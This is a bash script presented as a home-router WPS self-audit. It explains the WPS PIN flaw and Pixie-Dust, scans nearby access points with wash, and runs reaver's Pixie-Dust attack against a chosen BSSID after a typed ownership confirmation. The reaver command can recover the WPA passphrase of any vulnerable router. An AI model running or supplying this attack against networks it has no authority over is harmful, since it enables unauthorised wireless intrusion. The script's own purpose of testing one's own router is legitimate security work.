#!/usr/bin/env bash
#
# wps_audit.sh — check whether YOUR OWN router is vulnerable via WPS.
#
# WHAT WPS IS AND WHY IT MATTERS:
#   WPS (WiFi Protected Setup) lets devices join with an 8-digit PIN instead of
#   the passphrase. The design flaw: the PIN is validated in two halves, and the
#   last digit is a checksum, so the real search space is only ~11,000 — tiny.
#   A "Pixie-Dust" flaw in some chipsets makes it instant. If WPS is on and
#   vulnerable, an attacker can recover your FULL WPA passphrase regardless of
#   how strong it is. The lesson and fix are simple: DISABLE WPS on your router.
#
#   This script runs a scan for WPS-enabled APs, then (only against YOUR BSSID,
#   after you confirm ownership) attempts the Pixie-Dust attack with reaver.
#
#   # 1) find WPS-enabled APs (informational)
#   sudo bash wifi/wps_audit.sh --iface wlan1mon --scan
#   # 2) test YOUR router
#   sudo bash wifi/wps_audit.sh --iface wlan1mon --bssid AA:BB:CC:DD:EE:FF --channel 6
#
set -euo pipefail

if [[ $EUID -ne 0 ]]; then echo "Run as root." >&2; exit 1; fi

IFACE="" BSSID="" CHANNEL="" SCAN=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    --iface)   IFACE="$2"; shift 2;;
    --bssid)   BSSID="$2"; shift 2;;
    --channel) CHANNEL="$2"; shift 2;;
    --scan)    SCAN=1; shift;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
    *) echo "Unknown option: $1" >&2; exit 1;;
  esac
done

[[ -n "$IFACE" ]] || { echo "Need --iface (monitor mode)." >&2; exit 1; }

if [[ "$SCAN" == 1 ]]; then
  command -v wash >/dev/null || { echo "Install reaver (provides 'wash'): apt install reaver" >&2; exit 1; }
  echo "[*] Scanning for WPS-enabled APs with 'wash'. Note YOUR router's BSSID/CH."
  echo "    Columns: BSSID, Channel, RSSI, WPS version, WPS locked, ESSID. Ctrl-C to stop."
  echo
  exec wash -i "$IFACE"
fi

if [[ -z "$BSSID" || -z "$CHANNEL" ]]; then
  echo "For the test you need --bssid (YOUR AP) and --channel. Or use --scan first." >&2
  exit 1
fi
command -v reaver >/dev/null || { echo "Install reaver: apt install reaver" >&2; exit 1; }

cat <<EOF

  About to run a WPS Pixie-Dust test against:
      BSSID   : $BSSID
      Channel : $CHANNEL
  Do this ONLY on a router you own or are authorized to test.

EOF
read -r -p "  Type YES if this router is yours: " CONFIRM
[[ "$CONFIRM" == "YES" ]] || { echo "Aborted."; exit 1; }

echo "[*] Running reaver Pixie-Dust (-K 1). If your router isn't vulnerable this"
echo "    fails quickly — which is the GOOD outcome (or just disable WPS entirely)."
# -K 1 = Pixie-Dust only (offline-ish, fast). Not a long online PIN brute force.
reaver -i "$IFACE" -b "$BSSID" -c "$CHANNEL" -K 1 -vv || true

echo
echo "[*] Takeaway: if a PSK/PIN was recovered, log into your router admin page"
echo "    and turn WPS OFF. That single setting closes this entire class of attack."
